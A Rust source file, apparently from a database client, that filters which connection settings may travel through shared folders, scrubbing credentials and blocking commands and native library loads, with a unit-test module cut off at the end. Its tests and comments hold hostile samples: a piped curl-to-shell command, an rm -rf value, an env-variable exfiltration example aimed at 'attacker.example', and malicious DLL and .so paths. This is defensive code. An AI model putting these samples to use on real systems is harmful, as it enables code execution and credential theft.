//! Connections as they leave the machine: an allow-list. [`ShareConnection`] has a field for
//! each thing that may be written to a sync file or a shared folder and none for anything that
//! could hold a credential, so a new secret-bearing field added to `SavedConnection` cannot
//! leak by being forgotten here: it is dropped until someone adds it on purpose.
//!
//! Left out on purpose: the password (it is in the keychain anyway), `password_command` (a
//! shell command that would run on a teammate's machine), `.pgpass`, the SSL certificate and
//! key paths, the SSH key paths and the ids of the keychain entries, and every driver option
//! but an allow-list (see [`scrub_options`]): the shell commands run before connecting and
//! after disconnecting, paths on this machine and credentials stay here, and are never taken
//! in from another machine or a shared file either.

use std::collections::BTreeMap;
use std::path::PathBuf;

use platypus_core::{DriverKind, SslMode};
use platypus_store::{
    AgentAccess, ConnectBy, ConnectionType, NetworkProfile, Restrictions, SavedConnection,
    SavedInit, SavedSsh, SshAuthKind, TextJson, VirtualKey,
};
use serde::{Deserialize, Serialize};
use uuid::Uuid;

/// Option names (lowercase) containing one of these hold a credential, or point at a file that
/// holds one, and never leave the machine, even when a future entry of [`SHARED_OPTIONS`]
/// would let them.
const SECRET_WORDS: [&str; 13] = [
    "password",
    "passwd",
    "pwd",
    "secret",
    "token",
    "credential",
    "private_key",
    "passphrase",
    "apikey",
    "api_key",
    "auth_key",
    "authorization",
    "cookie",
];

/// The driver options that may travel to another machine or a teammate: an allow-list, so an
/// option added later (a shell command, a path, a credential) stays on this machine until
/// someone adds it here on purpose. Left out on purpose: `before_connect` and
/// `after_disconnect` (shell commands that would run on the other machine), `env_file`,
/// `driver_file` and `credentials_file` (paths on this machine), and anything secret.
const SHARED_OPTIONS: [&str; 27] = [
    // Snowflake, BigQuery, Databricks, Trino and plain ADBC.
    "warehouse",
    "role",
    "schema",
    "project",
    "dataset",
    "http_path",
    "uri",
    "url",
    "dialect",
    // ODBC: the driver's name, a DSN's name, the rest of the string (scrubbed).
    "driver",
    "dsn",
    "connection_string",
    "dsn_string",
    // How the connection is reached and signed in to.
    "auth",
    "pooler",
    "flavor",
    "proxy",
    "forward",
    "k8s_target",
    "k8s_namespace",
    "k8s_context",
    "ssm_target",
    "aws_region",
    "aws_profile",
    // A plugin's driver, and how files are read.
    "plugin",
    "encoding",
    "skip_bad_lines",
];

fn is_secret_name(name: &str) -> bool {
    let name = name.to_lowercase();
    SECRET_WORDS.iter().any(|w| name.contains(w))
}

/// Whether the option `name` may leave this machine (see [`SHARED_OPTIONS`]).
#[must_use]
pub fn is_shared_option(name: &str) -> bool {
    let lower = name.to_lowercase();
    !is_secret_name(&lower) && SHARED_OPTIONS.contains(&lower.as_str())
}

/// `a=b;c=d` pairs without the ones whose name holds a credential (`PWD=`, `Password=`…).
fn scrub_pairs(text: &str, separator: char) -> String {
    text.split(separator)
        .filter(|pair| {
            let name = pair.split_once('=').map_or("", |(n, _)| n);
            !is_secret_name(name)
        })
        .collect::<Vec<_>>()
        .join(&separator.to_string())
}

/// `user:password@host…` without the `user:password@`; `host…` alone stays as it is.
fn without_userinfo(authority: &str) -> &str {
    authority
        .rsplit_once('@')
        .map_or(authority, |(_, host)| host)
}

/// A URL without the password of its `user:password@` part and without secret query pairs.
fn scrub_uri(uri: &str) -> String {
    let (head, query) = match uri.split_once('?') {
        Some((h, q)) => (h, Some(scrub_pairs(q, '&'))),
        None => (uri, None),
    };
    let head = match head.split_once("://") {
        Some((scheme, rest)) => {
            let (authority, path) = rest.find('/').map_or((rest, ""), |i| rest.split_at(i));
            // Neither the user nor the password: the user has its own field.
            format!("{scheme}://{}{path}", without_userinfo(authority))
        }
        None => head.to_owned(),
    };
    match query {
        Some(q) if !q.is_empty() => format!("{head}?{q}"),
        _ => head,
    }
}

/// A proxy address (`http://user:pw@host:3128`, or `user:pw@host:3128` without a scheme)
/// without its login.
fn scrub_proxy(proxy: &str) -> String {
    if proxy.contains("://") {
        scrub_uri(proxy)
    } else {
        without_userinfo(proxy).to_owned()
    }
}

/// The value of a shared option without the credentials it may hold.
fn scrub_option(name: &str, value: &str) -> String {
    match name.to_lowercase().as_str() {
        "uri" | "url" => scrub_uri(value),
        "proxy" => scrub_proxy(value),
        "connection_string" | "dsn_string" => scrub_pairs(value, ';'),
        _ => value.to_owned(),
    }
}

/// The driver options that may be shared, with credentials removed from the ones that stay.
#[must_use]
pub fn scrub_options(options: &BTreeMap<String, String>) -> BTreeMap<String, String> {
    options
        .iter()
        .filter(|(name, _)| is_shared_option(name))
        .map(|(name, value)| (name.clone(), scrub_option(name, value)))
        .collect()
}

/// The options of a connection taken in from another machine or a shared file: the ones that
/// may travel come from `incoming` (scrubbed again: a hand-edited file may carry what this
/// build would never write), every other one stays as this machine has it. A scrubbed
/// address equal to this machine's keeps this machine's login.
fn merge_options(
    incoming: &BTreeMap<String, String>,
    local: Option<&BTreeMap<String, String>>,
) -> BTreeMap<String, String> {
    let mut options = scrub_options(incoming);
    for (name, value) in local.into_iter().flatten() {
        if !is_shared_option(name) {
            options.insert(name.clone(), value.clone());
        } else if let Some(kept) = options.get_mut(name)
            && *kept == scrub_option(name, value)
        {
            kept.clone_from(value);
        }
    }
    options
}

/// An SSH server without keys or keychain entries.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct ShareSsh {
    pub host: String,
    pub port: u16,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub user: Option<String>,
    #[serde(default)]
    pub auth: SshAuthKind,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub jump: Option<Box<ShareSsh>>,
}

impl ShareSsh {
    fn from_saved(ssh: &SavedSsh, keep_user: bool) -> Self {
        Self {
            host: ssh.host.clone(),
            port: ssh.port,
            user: keep_user.then(|| ssh.user.clone()),
            auth: ssh.auth,
            jump: ssh
                .jump
                .as_ref()
                .map(|j| Box::new(Self::from_saved(j, keep_user))),
        }
    }

    /// The saved server; keys and keychain entries of the same hop in `existing` stay.
    fn into_saved(self, existing: Option<&SavedSsh>) -> SavedSsh {
        let jump_existing = existing.and_then(|e| e.jump.as_deref());
        SavedSsh {
            user: self
                .user
                .or_else(|| existing.map(|e| e.user.clone()))
                .unwrap_or_default(),
            host: self.host,
            port: self.port,
            auth: self.auth,
            key_path: existing.and_then(|e| e.key_path.clone()),
            secret_id: existing.map_or_else(Uuid::new_v4, |e| e.secret_id),
            jump: self.jump.map(|j| Box::new(j.into_saved(jump_existing))),
        }
    }
}

/// A connection as it is shared. The plain values come first: TOML writes them before tables.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct ShareConnection {
    pub id: Uuid,
    pub name: String,
    pub driver: DriverKind,
    #[serde(default)]
    pub host: String,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub port: Option<u16>,
    /// The database, or the file path for SQLite.
    #[serde(default)]
    pub database: String,
    /// Only when the sharer chose to share user names.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub user: Option<String>,
    #[serde(default)]
    pub ssl_mode: SslMode,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub network_profile: Option<Uuid>,
    #[serde(default)]
    pub read_only: bool,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub color: Option<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub connection_type: Option<ConnectionType>,
    #[serde(default)]
    pub agent_access: AgentAccess,
    #[serde(default)]
    pub text_json: TextJson,
    #[serde(default)]
    pub connect_by: ConnectBy,
    /// The folder of the project the connection is in; only in a shared project's file.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub folder: Option<Uuid>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub ssh: Option<ShareSsh>,
    #[serde(default, skip_serializing_if = "SavedInit::is_empty")]
    pub init: SavedInit,
    #[serde(default, skip_serializing_if = "Restrictions::is_none")]
    pub restrictions: Restrictions,
    #[serde(default, skip_serializing_if = "BTreeMap::is_empty")]
    pub options: BTreeMap<String, String>,
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub virtual_keys: Vec<VirtualKey>,
}

impl ShareConnection {
    /// The shareable part of `c`; the user names only with `keep_user`.
    #[must_use]
    pub fn from_saved(c: &SavedConnection, keep_user: bool) -> Self {
        Self {
            id: c.id,
            name: c.name.clone(),
            driver: c.driver,
            host: c.host.clone(),
            port: c.port,
            database: c.database.clone(),
            user: keep_user.then(|| c.user.clone()),
            ssl_mode: c.ssl_mode,
            network_profile: c.network_profile,
            read_only: c.read_only,
            color: c.color.clone(),
            connection_type: c.connection_type,
            agent_access: c.agent_access,
            text_json: c.text_json,
            connect_by: c.connect_by,
            folder: None,
            ssh: c.ssh.as_ref().map(|s| ShareSsh::from_saved(s, keep_user)),
            init: c.init.clone(),
            restrictions: c.restrictions,
            options: scrub_options(&c.options),
            virtual_keys: c.virtual_keys.clone(),
        }
    }

    /// The connection to save: this one's shared fields over `existing`, whose private ones
    /// (password settings, certificate and key paths, keychain entries, and the options
    /// that are never shared) stay. A new connection keeps its password in the keychain
    /// (asked at the first connect) unless it needs none.
    #[must_use]
    pub fn into_saved(self, existing: Option<&SavedConnection>) -> SavedConnection {
        let mut c = existing.cloned().unwrap_or_else(|| {
            let mut c = SavedConnection::new(self.name.clone(), self.driver);
            c.id = self.id;
            c
        });
        c.name = self.name;
        c.driver = self.driver;
        c.host = self.host;
        c.port = self.port;
        c.database = self.database;
        if let Some(user) = self.user {
            c.user = user;
        }
        c.ssl_mode = self.ssl_mode;
        c.network_profile = self.network_profile;
        c.read_only = self.read_only;
        c.color = self.color;
        c.connection_type = self.connection_type;
        c.agent_access = self.agent_access;
        c.text_json = self.text_json;
        c.connect_by = self.connect_by;
        c.ssh = self
            .ssh
            .map(|s| s.into_saved(existing.and_then(|e| e.ssh.as_ref())));
        c.init = self.init;
        c.restrictions = self.restrictions;
        c.options = merge_options(&self.options, existing.map(|e| &e.options));
        c.virtual_keys = self.virtual_keys;
        if existing.is_none() {
            c.save_password = !c.driver.is_embedded() && !c.signs_in_without_password();
        }
        c
    }
}

/// Options that say where a connection goes or through what; changing one sends the
/// connection, and the credentials it signs in with, somewhere else.
const TARGET_OPTIONS: [&str; 14] = [
    "uri",
    "url",
    "connection_string",
    "dsn",
    "dsn_string",
    "driver",
    "plugin",
    "http_path",
    "proxy",
    "forward",
    "k8s_target",
    "k8s_namespace",
    "k8s_context",
    "ssm_target",
];

/// Where a connection connects: the server, the database, the tunnel (its hops, outermost
/// last) and the options that route it.
#[derive(PartialEq, Eq)]
struct Target<'a> {
    driver: DriverKind,
    host: String,
    port: Option<u16>,
    database: &'a str,
    hops: Vec<(String, u16)>,
    options: Vec<(&'a str, &'a str)>,
}

impl<'a> Target<'a> {
    fn of(c: &'a SavedConnection) -> Self {
        Self {
            driver: c.driver,
            host: c.host.trim().to_lowercase(),
            port: c.port,
            database: c.database.trim(),
            hops: c
                .ssh
                .iter()
                .flat_map(SavedSsh::chain)
                .map(|s| (s.host.trim().to_lowercase(), s.port))
                .collect(),
            options: TARGET_OPTIONS
                .iter()
                .filter_map(|o| c.options.get(*o).map(|v| (*o, v.trim())))
                .collect(),
        }
    }
}

/// How much an SSL mode protects the password on the way: higher is safer.
fn ssl_rank(mode: SslMode) -> u8 {
    match mode {
        SslMode::Disable => 0,
        SslMode::Prefer => 1,
        SslMode::Require => 2,
        SslMode::VerifyCa => 3,
        SslMode::VerifyFull => 4,
    }
}

/// What [`guard`] did to a connection updated from a shared folder.
#[derive(Debug, Clone, Copy, Default, PartialEq, Eq)]
pub struct Guarded {
    /// It goes somewhere else now (another server, database, tunnel, or a weaker SSL mode):
    /// the credentials this machine keeps for it must be forgotten, so they are asked again
    /// instead of being sent to the new place.
    pub retargeted: bool,
    /// The file loosened a safety setting (agent access, restrictions, read-only, the
    /// production type): this machine's stricter one was kept.
    pub kept_stricter: bool,
}

/// Checks an update from a shared folder, which anyone with write access to it can edit,
/// against the connection `before` it (as this machine connects to it, with its network
/// profile in place). A connection that goes somewhere else loses its password command (the
/// caller forgets its saved secrets); safety settings are never loosened, the stricter of the
/// two is kept.
pub fn guard(before: &SavedConnection, after: &mut SavedConnection) -> Guarded {
    let retargeted = Target::of(before) != Target::of(after)
        || ssl_rank(after.ssl_mode) < ssl_rank(before.ssl_mode);
    if retargeted {
        after.password_command = None;
    }
    let mut stricter = after.clone();
    stricter.agent_access = before.agent_access.min(after.agent_access);
    stricter.read_only |= before.read_only;
    stricter.restrictions.no_export |= before.restrictions.no_export;
    stricter.restrictions.no_data_editing |= before.restrictions.no_data_editing;
    if before.connection_type == Some(ConnectionType::Prod) {
        stricter.connection_type = Some(ConnectionType::Prod);
    }
    let kept_stricter = stricter != *after;
    *after = stricter;
    Guarded {
        retargeted,
        kept_stricter,
    }
}

/// `text` with each `${` that would read an environment variable written `$${`, which a
/// connection reads as the text itself; one written so already stays as it is.
#[must_use]
pub fn held_references(text: &str) -> String {
    let mut out = String::with_capacity(text.len() + 1);
    let mut rest = text;
    while let Some(at) = rest.find("${") {
        out.push_str(&rest[..at]);
        if !rest[..at].ends_with('$') {
            out.push('$');
        }
        out.push_str("${");
        rest = &rest[at + 2..];
    }
    out.push_str(rest);
    out
}

/// Holds the references of `field`, set from a shared file, unless it says what `before`
/// (this machine's text) says up to held references: then this machine's text stays.
/// Whether a reference was held.
fn hold(field: &mut String, before: Option<&str>) -> bool {
    if !field.contains("${") {
        return false;
    }
    let held = held_references(field);
    if let Some(before) = before
        && held_references(before) == held
    {
        before.clone_into(field);
        return false;
    }
    let changed = held != *field;
    *field = held;
    changed
}

/// Holds the `${env:NAME}` references of the fields that a shared project file sets or
/// changes on a connection, against `before` (this machine's, `None` for a new one): they read
/// this computer's environment, and a file anyone with write access to the folder can edit
/// could send a variable to a server of its choosing (`host = "attacker.example"`,
/// `user = "${env:AWS_SECRET_ACCESS_KEY}"`). Held as `$${…}`, the field connects as written
/// until the user edits it in the connection's form; fields equal to this machine's keep
/// their references. Whether any was held.
pub fn hold_shared_references(
    before: Option<&SavedConnection>,
    after: &mut SavedConnection,
) -> bool {
    let mut held = false;
    held |= hold(&mut after.host, before.map(|b| b.host.as_str()));
    held |= hold(&mut after.database, before.map(|b| b.database.as_str()));
    held |= hold(&mut after.user, before.map(|b| b.user.as_str()));
    if let Some(schema) = &mut after.init.schema {
        let old = before.and_then(|b| b.init.schema.as_deref());
        held |= hold(schema, old);
    }
    for (name, value) in &mut after.options {
        let old = before.and_then(|b| b.options.get(name)).map(String::as_str);
        held |= hold(value, old);
    }
    let old_hops: Vec<&SavedSsh> = before
        .and_then(|b| b.ssh.as_ref())
        .map(|s| s.chain().collect())
        .unwrap_or_default();
    let mut hop = after.ssh.as_mut();
    let mut depth = 0;
    while let Some(ssh) = hop {
        let old = old_hops.get(depth);
        held |= hold(&mut ssh.host, old.map(|o| o.host.as_str()));
        held |= hold(&mut ssh.user, old.map(|o| o.user.as_str()));
        hop = ssh.jump.as_deref_mut();
        depth += 1;
    }
    held
}

/// Whether the ODBC driver `value` is a library's path rather than an installed driver's
/// name: a shared file could make the driver manager load native code from anywhere.
fn is_library_path(value: &str) -> bool {
    let value = value.trim().trim_start_matches('{').trim_end_matches('}');
    let lower = value.to_lowercase();
    value.contains(['/', '\\'])
        || value.as_bytes().get(1) == Some(&b':')
        || [".so", ".dll", ".dylib"].iter().any(|e| lower.ends_with(e))
        || lower.contains(".so.")
}

/// An ODBC connection string without the pairs a shared file must not set: `FILEDSN` and
/// `SAVEFILE` (a file read or written, on a share they leak the Windows login), a `DRIVER`
/// given as a library's path, and any value that is a network path (`\\host\share`).
fn without_native_pairs(text: &str) -> String {
    text.split(';')
        .filter(|pair| {
            let (name, value) = pair.split_once('=').unwrap_or((pair, ""));
            let name = name.trim().to_lowercase();
            let value = value.trim().trim_start_matches('{');
            let network = value.starts_with("\\\\") || value.starts_with("//");
            let library = name == "driver" && is_library_path(value);
            !(name == "filedsn" || name == "savefile" || library || network)
        })
        .collect::<Vec<_>>()
        .join(";")
}

/// Keeps a shared project file from making the ODBC driver manager load a library or open a
/// file of its choosing: a `driver` option given as a path is replaced by this machine's
/// (or left out), and the connection strings lose `FILEDSN`, `SAVEFILE`, a `DRIVER` path and
/// network paths. Values equal to this machine's stay: they are the user's own. Whether any
/// was changed.
pub fn without_native_loads(before: Option<&SavedConnection>, after: &mut SavedConnection) -> bool {
    let old = |name: &str| before.and_then(|b| b.options.get(name)).cloned();
    let mut changed = false;
    if let Some(driver) = after.options.get("driver").cloned()
        && old("driver").as_ref() != Some(&driver)
        && is_library_path(&driver)
    {
        match old("driver") {
            Some(mine) => after.options.insert("driver".to_owned(), mine),
            None => after.options.remove("driver"),
        };
        changed = true;
    }
    for name in ["connection_string", "dsn_string"] {
        if let Some(text) = after.options.get_mut(name)
            && old(name).as_ref() != Some(text)
        {
            let clean = without_native_pairs(text);
            changed |= clean != *text;
            *text = clean;
        }
    }
    changed
}

/// A network profile without keys.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct ShareProfile {
    pub id: Uuid,
    pub name: String,
    #[serde(default)]
    pub ssl_mode: SslMode,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub ssh: Option<ShareSsh>,
}

impl ShareProfile {
    #[must_use]
    pub fn from_saved(p: &NetworkProfile, keep_user: bool) -> Self {
        Self {
            id: p.id,
            name: p.name.clone(),
            ssl_mode: p.ssl_mode,
            ssh: p.ssh.as_ref().map(|s| ShareSsh::from_saved(s, keep_user)),
        }
    }

    #[must_use]
    pub fn into_saved(self, existing: Option<&NetworkProfile>) -> NetworkProfile {
        NetworkProfile {
            id: self.id,
            name: self.name,
            ssl_mode: self.ssl_mode,
            ssl_root_cert: existing.and_then(|e| e.ssl_root_cert.clone()),
            ssl_client_cert: existing.and_then(|e| e.ssl_client_cert.clone()),
            ssl_client_key: existing.and_then(|e| e.ssl_client_key.clone()),
            ssh: self
                .ssh
                .map(|s| s.into_saved(existing.and_then(|e| e.ssh.as_ref()))),
        }
    }
}

/// The paths a connection keeps for itself, for tests that look for leaks.
#[must_use]
pub fn private_paths(c: &SavedConnection) -> Vec<PathBuf> {
    [&c.ssl_root_cert, &c.ssl_client_cert, &c.ssl_client_key]
        .into_iter()
        .flatten()
        .cloned()
        .chain(
            c.ssh
                .iter()
                .flat_map(SavedSsh::chain)
                .filter_map(|s| s.key_path.clone()),
        )
        .collect()
}

#[cfg(test)]
mod tests {
    use super::*;

    /// A connection with a canary in every field that holds, or points at, a credential.
    fn leaky() -> SavedConnection {
        let mut c = SavedConnection::new("Prod", DriverKind::Postgres);
        c.host = "db.example.com".to_owned();
        c.user = "alice".to_owned();
        c.database = "sales".to_owned();
        c.port = Some(5432);
        c.save_password = true;
        c.password_command = Some("echo CANARY_PASSWORD_COMMAND".to_owned());
        c.pgpass = true;
        c.ssl_root_cert = Some("/CANARY/root.pem".into());
        c.ssl_client_cert = Some("/CANARY/client.pem".into());
        c.ssl_client_key = Some("/CANARY/client.key".into());
        c.options = BTreeMap::from([
            ("warehouse".to_owned(), "WH".to_owned()),
            ("password".to_owned(), "CANARY_OPT_PASSWORD".to_owned()),
            ("access_token".to_owned(), "CANARY_TOKEN".to_owned()),
            ("credentials_file".to_owned(), "/CANARY/sa.json".to_owned()),
            ("driver_file".to_owned(), "/CANARY/driver.so".to_owned()),
            (
                "uri".to_owned(),
                "grpc://bob:CANARY_URI_PW@host:1/db?token=CANARY_Q&mode=x".to_owned(),
            ),
            (
                "connection_string".to_owned(),
                "Server=h;PWD=CANARY_ODBC;Database=d;Password=CANARY_ODBC2".to_owned(),
            ),
        ]);
        let jump = SavedSsh {
            host: "jump.example.com".to_owned(),
            port: 22,
            user: "jumper".to_owned(),
            auth: SshAuthKind::Key,
            key_path: Some("/CANARY/jump_key".into()),
            secret_id: Uuid::new_v4(),
            jump: None,
        };
        c.ssh = Some(SavedSsh {
            host: "bastion.example.com".to_owned(),
            port: 2222,
            user: "carol".to_owned(),
            auth: SshAuthKind::Key,
            key_path: Some("/CANARY/id_ed25519".into()),
            secret_id: Uuid::new_v4(),
            jump: Some(Box::new(jump)),
        });
        c
    }

    /// Every name of a field that holds a credential or points at a file with one.
    const SECRET_FIELDS: [&str; 9] = [
        "password",
        "password_command",
        "pgpass",
        "ssl_root_cert",
        "ssl_client_cert",
        "ssl_client_key",
        "key_path",
        "secret_id",
        "save_password",
    ];

    fn outputs(c: &SavedConnection, keep_user: bool) -> Vec<String> {
        let shared = ShareConnection::from_saved(c, keep_user);
        vec![
            serde_json::to_string(&shared).unwrap(),
            toml::to_string_pretty(&shared).unwrap(),
        ]
    }

    #[test]
    fn no_secret_value_or_field_name_is_ever_written() {
        let c = leaky();
        let mut canaries = vec!["CANARY".to_owned()];
        for ssh in c.ssh.iter().flat_map(SavedSsh::chain) {
            canaries.push(ssh.secret_id.to_string());
        }
        for keep_user in [false, true] {
            for text in outputs(&c, keep_user) {
                for canary in &canaries {
                    assert!(!text.contains(canary.as_str()), "{canary} in {text}");
                }
                for field in SECRET_FIELDS {
                    assert!(
                        !text.contains(&format!("\"{field}\""))
                            && !text.contains(&format!("{field} =")),
                        "field {field} in {text}"
                    );
                }
            }
        }
    }

    #[test]
    fn what_may_be_shared_is_kept() {
        let c = leaky();
        let text = outputs(&c, false).remove(1);
        for kept in [
            "db.example.com",
            "sales",
            "5432",
            "bastion.example.com",
            "jump.example.com",
            "warehouse",
        ] {
            assert!(text.contains(kept), "{kept} missing in {text}");
        }
        let opts = scrub_options(&c.options);
        assert_eq!(opts["uri"], "grpc://host:1/db?mode=x");
        assert_eq!(opts["connection_string"], "Server=h;Database=d");
        assert_eq!(opts.len(), 3, "{opts:?}");
    }

    #[test]
    fn user_names_follow_the_choice() {
        let c = leaky();
        let without = outputs(&c, false).remove(0);
        assert!(
            !without.contains("alice") && !without.contains("carol") && !without.contains("jumper")
        );
        let with = outputs(&c, true).remove(0);
        assert!(with.contains("alice") && with.contains("carol") && with.contains("jumper"));
    }

    #[test]
    fn applying_keeps_what_the_machine_has_privately() {
        let mut mine = leaky();
        let mut shared = ShareConnection::from_saved(&mine, false);
        shared.host = "new.example.com".to_owned();
        shared.ssh.as_mut().unwrap().host = "newbastion".to_owned();
        let saved = shared.into_saved(Some(&mine));
        assert_eq!(saved.host, "new.example.com");
        assert_eq!(saved.user, "alice", "no shared user: the local one stays");
        assert_eq!(
            saved.password_command.as_deref(),
            Some("echo CANARY_PASSWORD_COMMAND")
        );
        assert!(saved.pgpass && saved.save_password);
        assert_eq!(saved.ssl_client_key, mine.ssl_client_key);
        let ssh = saved.ssh.as_ref().unwrap();
        assert_eq!(ssh.host, "newbastion");
        assert_eq!(ssh.key_path, mine.ssh.as_ref().unwrap().key_path);
        assert_eq!(ssh.secret_id, mine.ssh.as_ref().unwrap().secret_id);
        assert_eq!(
            ssh.jump.as_ref().unwrap().key_path.as_deref(),
            Some(std::path::Path::new("/CANARY/jump_key"))
        );
        assert_eq!(
            saved.options["password"], "CANARY_OPT_PASSWORD",
            "private options stay"
        );
        mine.user = "zed".to_owned();
        let shared = ShareConnection::from_saved(&mine, true);
        assert_eq!(shared.into_saved(Some(&leaky())).user, "zed");
    }

    #[test]
    fn references_are_held_once_and_read_as_written() {
        for (text, held) in [
            ("db.example.com", "db.example.com"),
            ("${env:HOST}", "$${env:HOST}"),
            ("$${env:HOST}", "$${env:HOST}"),
            ("a${env:A}-${env:B}", "a$${env:A}-$${env:B}"),
            ("${", "$${"),
        ] {
            assert_eq!(held_references(text), held, "{text}");
            assert_eq!(held_references(held), held, "{held} twice");
        }
        let vars = platypus_core::EnvVars::with(
            BTreeMap::from([("A".to_owned(), "CANARY".to_owned())]),
            BTreeMap::new(),
        );
        assert_eq!(
            platypus_core::expand_env(&held_references("x${env:A}"), &vars).unwrap(),
            "x${env:A}"
        );

        // New fields are held, the SSH hops and options included; this machine's stay.
        let mut before = SavedConnection::new("c", DriverKind::Postgres);
        before
            .options
            .insert("warehouse".to_owned(), "${env:WH}".to_owned());
        let mut after = before.clone();
        after.host = "${env:H}".to_owned();
        after.init.schema = Some("${env:S}".to_owned());
        after
            .options
            .insert("role".to_owned(), "${env:R}".to_owned());
        after.ssh = Some(SavedSsh {
            host: "bastion".to_owned(),
            port: 22,
            user: "${env:U}".to_owned(),
            auth: SshAuthKind::Agent,
            key_path: None,
            secret_id: Uuid::nil(),
            jump: Some(Box::new(SavedSsh {
                host: "${env:J}".to_owned(),
                port: 22,
                user: String::new(),
                auth: SshAuthKind::Agent,
                key_path: None,
                secret_id: Uuid::nil(),
                jump: None,
            })),
        });
        assert!(hold_shared_references(Some(&before), &mut after));
        assert_eq!(after.host, "$${env:H}");
        assert_eq!(after.init.schema.as_deref(), Some("$${env:S}"));
        assert_eq!(after.options["role"], "$${env:R}");
        assert_eq!(after.options["warehouse"], "${env:WH}");
        let ssh = after.ssh.as_ref().unwrap();
        assert_eq!(ssh.user, "$${env:U}");
        assert_eq!(ssh.jump.as_ref().unwrap().host, "$${env:J}");
        assert!(!hold_shared_references(Some(&before), &mut before.clone()));
    }

    #[test]
    fn odbc_settings_from_a_shared_file_load_no_library() {
        for driver in [
            "/opt/evil/libevil.so",
            "C:\\evil\\evil.dll",
            "\\\\attacker\\share\\x.dll",
            "{libevil.so.1}",
            "evil.dylib",
        ] {
            assert!(is_library_path(driver), "{driver}");
        }
        for driver in [
            "ODBC Driver 18 for SQL Server",
            "{PostgreSQL Unicode}",
            "SQLite3",
        ] {
            assert!(!is_library_path(driver), "{driver}");
        }
        assert_eq!(
            without_native_pairs(
                "Driver={ODBC Driver 18 for SQL Server};Server=h;FileDSN=x.dsn;SaveFile=y;KeyFile={\\\\host\\k}"
            ),
            "Driver={ODBC Driver 18 for SQL Server};Server=h"
        );

        let mut before = SavedConnection::new("c", DriverKind::Odbc);
        before
            .options
            .insert("driver".to_owned(), "/usr/lib/my/libodbc.so".to_owned());
        before.options.insert(
            "connection_string".to_owned(),
            "FILEDSN=mine.dsn".to_owned(),
        );
        // This machine's own values are the user's: they stay.
        let mut same = before.clone();
        assert!(!without_native_loads(Some(&before), &mut same));
        assert_eq!(same, before);
        // A path from the file gives way to this machine's driver, or to none.
        let mut after = before.clone();
        after
            .options
            .insert("driver".to_owned(), "/tmp/evil.so".to_owned());
        after.options.insert(
            "connection_string".to_owned(),
            "FILEDSN=\\\\evil\\x;Server=h".to_owned(),
        );
        assert!(without_native_loads(Some(&before), &mut after));
        assert_eq!(after.options["driver"], "/usr/lib/my/libodbc.so");
        assert_eq!(after.options["connection_string"], "Server=h");
        let mut fresh = after.clone();
        fresh
            .options
            .insert("driver".to_owned(), "/tmp/evil.so".to_owned());
        assert!(without_native_loads(None, &mut fresh));
        assert!(!fresh.options.contains_key("driver"));
    }

    #[test]
    fn a_new_connection_asks_for_its_password_once_and_keeps_it() {
        let c = leaky();
        let saved = ShareConnection::from_saved(&c, true).into_saved(None);
        assert!(
            saved.save_password,
            "kept in the keychain after the first prompt"
        );
        assert!(saved.password_command.is_none() && !saved.pgpass);
        assert!(saved.ssl_client_key.is_none());
        assert!(saved.ssh.as_ref().unwrap().key_path.is_none());
        let lite = SavedConnection::new("L", DriverKind::Sqlite);
        assert!(
            !ShareConnection::from_saved(&lite, true)
                .into_saved(None)
                .save_password
        );
    }

    #[test]
    fn json_and_toml_round_trip() {
        let shared = ShareConnection::from_saved(&leaky(), true);
        let json: ShareConnection =
            serde_json::from_str(&serde_json::to_string(&shared).unwrap()).unwrap();
        assert_eq!(json, shared);
        let toml_text = toml::to_string_pretty(&shared).unwrap();
        let back: ShareConnection = toml::from_str(&toml_text).unwrap();
        assert_eq!(back, shared);
    }

    #[test]
    fn commands_paths_and_unknown_options_never_travel_either_way() {
        let mut c = leaky();
        for (name, value) in [
            ("before_connect", "curl CANARY_BEFORE | sh"),
            ("after_disconnect", "rm -rf CANARY_AFTER"),
            ("env_file", "/CANARY/.env"),
            ("some_future_option", "CANARY_FUTURE"),
            ("proxy", "http://bob:CANARY_PROXY_PW@proxy.example.com:3128"),
        ] {
            c.options.insert(name.to_owned(), value.to_owned());
        }
        for text in outputs(&c, true) {
            assert!(!text.contains("CANARY"), "{text}");
            assert!(!text.contains("before_connect") && !text.contains("env_file"));
            assert!(text.contains("http://proxy.example.com:3128"), "{text}");
        }
        assert_eq!(
            scrub_proxy("bob:pw@proxy:3128"),
            "proxy:3128",
            "a proxy without a scheme loses its login too"
        );
        // A shared file or a sync item that carries them anyway (written by hand, or by a
        // teammate who wants a command to run here) is not taken in.
        let mut planted = ShareConnection::from_saved(&c, true);
        planted.options = c.options.clone();
        let fresh = planted.clone().into_saved(None);
        for name in [
            "before_connect",
            "after_disconnect",
            "env_file",
            "some_future_option",
        ] {
            assert!(!fresh.options.contains_key(name), "{name}");
        }
        assert_eq!(fresh.options["proxy"], "http://proxy.example.com:3128");
        // This machine's own values stay, the planted ones do not replace them.
        let mut mine = leaky();
        mine.options
            .insert("before_connect".to_owned(), "my-vpn up".to_owned());
        mine.options.insert(
            "proxy".to_owned(),
            "http://me:my-pw@proxy.example.com:3128".to_owned(),
        );
        let kept = planted.clone().into_saved(Some(&mine));
        assert_eq!(kept.options["before_connect"], "my-vpn up");
        assert!(!kept.options.contains_key("after_disconnect"));
        assert_eq!(
            kept.options["proxy"], "http://me:my-pw@proxy.example.com:3128",
            "the same proxy keeps this machine's login"
        );
        planted
            .options
            .insert("proxy".to_owned(), "http://evil.example.com:1".to_owned());
        assert_eq!(
            planted.into_saved(Some(&mine)).options["proxy"],
            "http://evil.example.com:1",
            "another proxy comes without this machine's login"
        );
    }

    #[test]
    fn a_connection_sent_elsewhere_or_loosened_is_guarded() {
        let mut before = leaky();
        before.agent_access = AgentAccess::Off;
        before.read_only = true;
        before.restrictions.no_export = true;
        before.connection_type = Some(ConnectionType::Prod);
